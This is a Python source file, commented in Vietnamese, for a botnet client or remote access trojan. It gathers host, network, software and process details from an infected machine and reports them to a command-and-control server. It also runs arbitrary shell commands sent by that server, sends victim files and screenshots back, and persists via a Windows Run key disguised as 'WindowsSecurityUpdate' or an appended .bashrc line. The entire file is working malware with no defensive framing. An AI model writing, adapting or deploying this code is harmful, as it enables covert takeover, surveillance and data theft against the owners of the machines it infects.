#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import json
import socket
import threading
import subprocess
import platform
import time
import datetime
import getpass
import hashlib
import base64
from pathlib import Path

# ==================== CẤU HÌNH ====================
C2_HOST = "127.0.0.1"  # IP server điều khiển
C2_PORT = 5555
BOT_ID = hashlib.md5(socket.gethostname().encode() + str(os.getpid()).encode()).hexdigest()[:12]

# ==================== THU THẬP THÔNG TIN ====================
def get_system_info():
    """Lấy thông tin chi tiết của máy bị nhiễm"""
    info = {}
    info["bot_id"] = BOT_ID
    info["hostname"] = socket.gethostname()
    info["os"] = platform.system() + " " + platform.release()
    info["os_version"] = platform.version()
    info["architecture"] = platform.machine()
    info["processor"] = platform.processor()
    info["username"] = getpass.getuser()
    info["ip"] = socket.gethostbyname(socket.gethostname())
    info["timestamp"] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    try:
        import psutil
        info["cpu_count"] = psutil.cpu_count()
        info["cpu_percent"] = psutil.cpu_percent(interval=1)
        info["memory_total"] = round(psutil.virtual_memory().total / (1024**3), 2)
        info["memory_used"] = round(psutil.virtual_memory().used / (1024**3), 2)
        info["disk_usage"] = {}
        for part in psutil.disk_partitions():
            try:
                usage = psutil.disk_usage(part.mountpoint)
                info["disk_usage"][part.device] = {
                    "total": round(usage.total / (1024**3), 2),
                    "used": round(usage.used / (1024**3), 2),
                    "free": round(usage.free / (1024**3), 2)
                }
            except:
                pass
    except:
        info["psutil_not_installed"] = True
    
    return info

def get_network_info():
    """Lấy thông tin mạng"""
    network = {}
    try:
        hostname = socket.gethostname()
        network["hostname"] = hostname
        network["local_ip"] = socket.gethostbyname(hostname)
        
        # Lấy IP public (gọi API)
        try:
            import urllib.request
            public_ip = urllib.request.urlopen('https://api.ipify.org', timeout=5).read().decode()
            network["public_ip"] = public_ip
        except:
            network["public_ip"] = "Unknown"
        
        # Lấy thông tin WiFi đã lưu (Windows)
        if platform.system() == "Windows":
            wifi_profiles = []
            try:
                output = subprocess.check_output("netsh wlan show profiles", shell=True, encoding='utf-8', errors='ignore')
                for line in output.split('\n'):
                    if ":" in line and "Tất cả" not in line and "All" not in line:
                        profile = line.split(":")[1].strip()
                        if profile:
                            wifi_profiles.append(profile)
                network["saved_wifi"] = wifi_profiles[:10]
            except:
                pass
    except:
        pass
    return network

def get_installed_software():
    """Lấy danh sách phần mềm đã cài đặt"""
    software = []
    try:
        if platform.system() == "Windows":
            import winreg
            keys = [
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
            ]
            for key_path in keys:
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                    i = 0
                    while True:
                        try:
                            subkey_name = winreg.EnumKey(key, i)
                            subkey = winreg.OpenKey(key, subkey_name)
                            try:
                                name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                                version = winreg.QueryValueEx(subkey, "DisplayVersion")[0] if "DisplayVersion" in [winreg.EnumValue(subkey, j)[0] for j in range(winreg.QueryInfoKey(subkey)[1])] else "Unknown"
                                if name:
                                    software.append({"name": name, "version": version})
                            except:
                                pass
                            winreg.CloseKey(subkey)
                            i += 1
                        except WindowsError:
                            break
                    winreg.CloseKey(key)
                except:
                    pass
        else:
            # Linux - dpkg
            try:
                output = subprocess.check_output("dpkg -l", shell=True, encoding='utf-8', errors='ignore')
                lines = output.split('\n')[5:50]
                for line in lines:
                    if line.strip():
                        parts = line.split()
                        if len(parts) >= 2:
                            software.append({"name": parts[1], "version": parts[2] if len(parts) > 2 else "Unknown"})
            except:
                pass
    except:
        pass
    return software[:30]

def get_processes():
    """Lấy danh sách tiến trình đang chạy"""
    processes = []
    try:
        if platform.system() == "Windows":
            output = subprocess.check_output("tasklist /FO CSV", shell=True, encoding='utf-8', errors='ignore')
            for line in output.split('\n')[1:30]:
                if line.strip():
                    parts = line.strip('"').split('","')
                    if len(parts) >= 2:
                        processes.append({"name": parts[0], "pid": parts[1]})
        else:
            output = subprocess.check_output("ps aux | head -30", shell=True, encoding='utf-8', errors='ignore')
            for line in output.split('\n')[1:]:
                if line.strip():
                    parts = line.split()
                    if len(parts) >= 2:
                        processes.append({"name": parts[-1], "pid": parts[1]})
    except:
        pass
    return processes

# ==================== C&C KẾT NỐI ====================
def send_to_c2(data):
    """Gửi dữ liệu JSON về C2 server"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((C2_HOST, C2_PORT))
        json_data = json.dumps(data)
        s.send(json_data.encode())
        response = s.recv(4096).decode()
        s.close()
        return response
    except:
        return None

def listen_for_commands():
    """Lắng nghe lệnh từ C2 server"""
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((C2_HOST, C2_PORT))
            
            # Gửi thông tin đăng ký
            register_msg = json.dumps({"type": "register", "bot_id": BOT_ID, "hostname": socket.gethostname()})
            s.send(register_msg.encode())
            
            while True:
                # Nhận lệnh
                cmd_data = s.recv(4096).decode()
                if not cmd_data:
                    break
                
                try:
                    cmd = json.loads(cmd_data)
                    cmd_type = cmd.get("type", "")
                    cmd_id = cmd.get("cmd_id", 0)
                    
                    if cmd_type == "get_info":
                        # Thu thập toàn bộ thông tin
                        result = {
                            "type": "info_response",
                            "cmd_id": cmd_id,
                            "bot_id": BOT_ID,
                            "system": get_system_info(),
                            "network": get_network_info(),
                            "software": get_installed_software(),
                            "processes": get_processes()
                        }
                        s.send(json.dumps(result).encode())
                    
                    elif cmd_type == "exec":
                        # Thực thi lệnh shell
                        command = cmd.get("command", "")
                        try:
                            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=30)
                            result = output.decode(errors='ignore')
                        except subprocess.TimeoutExpired:
                            result = "Timeout"
                        except Exception as e:
                            result = str(e)
                        
                        s.send(json.dumps({"type": "exec_response", "cmd_id": cmd_id, "bot_id": BOT_ID, "output": result}).encode())
                    
                    elif cmd_type == "download":
                        # Tải file từ máy nạn nhân
                        filepath = cmd.get("path", "")
                        if os.path.exists(filepath) and os.path.isfile(filepath):
                            with open(filepath, "rb") as f:
                                file_data = base64.b64encode(f.read()).decode()
                            s.send(json.dumps({"type": "download_response", "cmd_id": cmd_id, "bot_id": BOT_ID, "file_data": file_data, "filename": os.path.basename(filepath)}).encode())
                        else:
                            s.send(json.dumps({"type": "download_response", "cmd_id": cmd_id, "bot_id": BOT_ID, "error": "File not found"}).encode())
                    
                    elif cmd_type == "screenshot":
                        # Chụp màn hình
                        try:
                            import pyautogui
                            screenshot = pyautogui.screenshot()
                            import io
                            buffer = io.BytesIO()
                            screenshot.save(buffer, format="PNG")
                            img_data = base64.b64encode(buffer.getvalue()).decode()
                            s.send(json.dumps({"type": "screenshot_response", "cmd_id": cmd_id, "bot_id": BOT_ID, "image": img_data}).encode())
                        except:
                            s.send(json.dumps({"type": "screenshot_response", "cmd_id": cmd_id, "bot_id": BOT_ID, "error": "Screenshot failed"}).encode())
                    
                    elif cmd_type == "exit":
                        s.close()
                        return
                        
                except json.JSONDecodeError:
                    pass
                    
        except Exception as e:
            time.sleep(5)

# ==================== PERSISTENCE ====================
def add_to_startup():
    """Thêm bot vào startup"""
    try:
        script_path = os.path.abspath(sys.argv[0])
        if platform.system() == "Windows":
            import winreg
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.SetValueEx(regkey, "WindowsSecurityUpdate", 0, winreg.REG_SZ, script_path)
        else:
            # Linux - thêm vào .bashrc hoặc .profile
            home = str(Path.home())
            rc_file = os.path.join(home, ".bashrc")
            with open(rc_file, "a") as f:
                f.write(f"\npython3 {script_path} &\n")
    except:
        pass

# ==================== MAIN ====================
def main():
    add_to_startup()
    
    while True:
        try:
            listen_for_commands()
        except:
            time.sleep(10)

if __name__ == "__main__":
    main()
